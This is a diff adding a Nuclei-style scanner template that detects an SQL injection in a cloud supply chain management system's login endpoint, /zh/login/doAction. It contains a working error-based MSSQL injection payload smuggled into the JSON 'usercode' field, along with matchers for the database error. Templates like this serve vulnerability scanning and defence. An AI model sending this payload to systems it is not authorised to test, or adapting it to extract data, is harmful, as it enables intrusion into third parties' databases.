@@ -1,0 +1,32 @@
+id: cloud-scms-doaction-sqli
+info:
+  name: Cloud Supply Chain Management System doAction SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - raw:
+      - |
+        POST /zh/login/doAction HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"usercode":"1'+(SELECT CHAR(83) WHERE 6635=6635 AND 2366 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')))))+'","password":"1","remember":false,"ip":null,"city":null,"ISERP":"ISERP"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+          - "SqlException"
+          - "0x{{t2}}"
+        part: body
+        condition: and
